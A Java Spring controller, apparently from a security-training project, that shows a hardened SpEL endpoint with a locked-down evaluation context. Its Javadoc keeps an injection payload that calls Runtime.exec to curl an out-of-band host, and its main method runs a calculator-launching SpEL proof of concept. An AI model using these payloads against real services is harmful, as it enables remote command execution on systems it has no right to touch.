package org.joychou.controller;

import org.springframework.web.util.HtmlUtils;
import org.springframework.expression.ConstructorResolver;
import org.springframework.expression.EvaluationException;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.MethodResolver;
import org.springframework.expression.PropertyAccessor;
import org.springframework.expression.TypeLocator;
import org.springframework.expression.spel.SpelEvaluationException;
import org.springframework.expression.spel.SpelMessage;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

import java.util.ArrayList;


/**
 * SpEL Injection
 *
 * @author JoyChou @2019-01-17
 */
@RestController
public class SpEL {

    private static final String SAFE_EXPRESSION = "'Result: ' + #input";

    /**
     * SpEL to RCE
     * http://localhost:8080/spel/vul/?expression=xxx.
     * xxx is urlencode(exp)
     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
     */
    @GetMapping("/spel/vuln")
    public String rce(String expression) {
        if (expression == null) {
            return "Bad boy. I got u.";
        }
        ExpressionParser parser = new SpelExpressionParser();
        // Constant server-side expression; request data is only bound as a variable (never parsed).
        // Locked-down context (Spring 4.3.6 has no SimpleEvaluationContext): no property/method/constructor
        // resolution, no type lookup, no bean refs.
        StandardEvaluationContext context = new StandardEvaluationContext();
        context.setPropertyAccessors(new ArrayList<PropertyAccessor>());
        context.setMethodResolvers(new ArrayList<MethodResolver>());
        context.setConstructorResolvers(new ArrayList<ConstructorResolver>());
        context.setBeanResolver(null);
        context.setTypeLocator(new TypeLocator() {
            @Override
            public Class<?> findType(String typeName) throws EvaluationException {
                throw new SpelEvaluationException(SpelMessage.TYPE_NOT_FOUND, typeName);
            }
        });
        context.setVariable("input", expression);
        Object result = parser.parseExpression(SAFE_EXPRESSION).getValue(context);
        return HtmlUtils.htmlEscape(String.valueOf(result));
    }

    public static void main(String[] args) {
        ExpressionParser parser = new SpelExpressionParser();
        String expression = "T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")";
        String result = parser.parseExpression(expression).getValue().toString();
        System.out.println(result);
    }
}

